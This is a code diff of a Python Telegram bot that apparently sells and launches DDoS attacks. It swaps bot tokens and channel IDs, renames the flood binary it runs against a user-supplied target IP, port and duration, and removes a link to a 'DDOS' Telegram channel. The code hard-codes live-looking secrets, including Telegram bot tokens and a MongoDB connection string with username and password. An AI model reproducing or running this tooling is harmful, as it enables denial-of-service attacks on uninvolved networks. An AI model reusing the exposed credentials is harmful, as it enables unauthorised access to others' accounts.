@@ -14,9 +14,9 @@ import subprocess
 
 loop = asyncio.get_event_loop()
 
-TOKEN = '8228422359:AAFbz9M7oBYrq_nhZHYNuGWlybX2Fc-4-OU' #Enter_Bot_Token_within_the_colons
+TOKEN = '7446000405:AAHWdlycnaWxZHfnbZBAP6KfdSUUf-FfCIw' #Enter_Bot_Token_within_the_colons
 MONGO_URI = 'mongodb+srv://Bishal:Bishal@bishal.dffybpx.mongodb.net/?retryWrites=true&w=majority&appName=Bishal'
-FORWARD_CHANNEL_ID = -1002938481761   
+FORWARD_CHANNEL_ID = -1002233729926   
 
 logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
 
@@ -34,7 +34,7 @@ running_processes = []
 error_channel_id = CHANNEL_ID = FORWARD_CHANNEL_ID
 REMOTE_HOST = '4.213.71.147'  
 async def run_attack_command_on_codespace(target_ip, target_port, duration):
-    command = f"./PAID {target_ip} {target_port} {duration} 600"
+    command = f"./lol {target_ip} {target_port} {duration} 600"
     try:
        
         process = await asyncio.create_subprocess_shell(
@@ -199,7 +199,7 @@ def handle_message(message):
         bot.reply_to(message, "*Initiating Attack...*", parse_mode='Markdown')
         attack_command(message)
     elif message.text == "Canary Download✔️":
-        bot.send_message(message.chat.id, "*Please use the following link for Canary Download: https://t.me/JODCLAN_DDOS/93*", parse_mode='Markdown')
+        bot.send_message(message.chat.id, "*Please use the following link for Canary Download: *", parse_mode='Markdown')
     elif message.text == "My Account🏦":
         user_id = message.from_user.id
         user_data = users_collection.find_one({"user_id": user_id})
@@ -232,4 +232,5 @@ if __name__ == "__main__":
         except Exception as e:
             logging.error(f"An error occurred while polling: {e}")
         logging.info(f"Waiting for {REQUEST_INTERVAL} seconds before the next request...")
+
         time.sleep(REQUEST_INTERVAL)
